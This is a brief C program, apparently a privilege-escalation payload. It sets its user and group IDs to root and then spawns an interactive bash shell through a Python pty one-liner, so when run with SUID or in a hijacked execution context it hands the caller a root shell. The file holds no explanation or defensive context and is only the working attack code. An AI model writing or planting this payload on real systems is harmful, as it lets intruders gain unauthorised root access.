#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
    return 0;
}
